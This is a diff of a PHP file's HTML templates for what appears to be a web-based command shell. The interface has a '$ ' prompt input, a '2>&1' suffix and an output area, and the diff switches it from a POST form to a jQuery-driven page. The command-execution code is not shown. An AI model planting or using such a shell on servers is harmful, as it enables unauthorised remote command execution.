@@ -18,28 +18,24 @@ $html_top = <<< EOF
 <!DOCTYPE SATAN>
 <html>
 	<head>
-		<style>
-			input{background-color:#fff;width:50%;}code,input,*{font-size:12px;color:#000;font-family:"Menlo","Monaco",
-			"Consolas",monospace !important;}body{background-color:#fafafa;}banana{ color:#aaa;}
-		</style>
+	<script type="text/javascript" src="./boogers/jquery-1.11.3.min.js"></script>
+	<script type="text/javascript" src="post.js"></script>
+	<link href="./boogers/styles.css" rel="stylesheet" />
 	</head>
 	<body>
-	<code><pre>
 		$up_the_dole
-	</pre></code>
-		<form action="$putin_huilo" method="POST">
-			<span>$ </span>
-			<input type="text" name="whosthere" autocomplete="off" autofocus>
+		<div id="form">
+			<input type="text" id="cmdline" name="007" autocomplete="off" autofocus>
 			<span>2&gt;&amp;1</span><br>
-			<button value="Submit" name="submit" type="submit">~\$ubM1t~~&gt;</button>
-		</form>
-		<code>
-			<pre><br><br>
+			<button id="submit-btn" value="Submit" name="submit" type="submit">~\$ubM1t~~&gt;</button>
+		</div>
+		<div id='out'>
+
 EOF;
 // gotta keep your html all semantic and proper and shit
 $html_bottom = <<< EOF
-			</pre>
-		</code>
+
+		</div>
 	</body>
 </html>
 EOF;
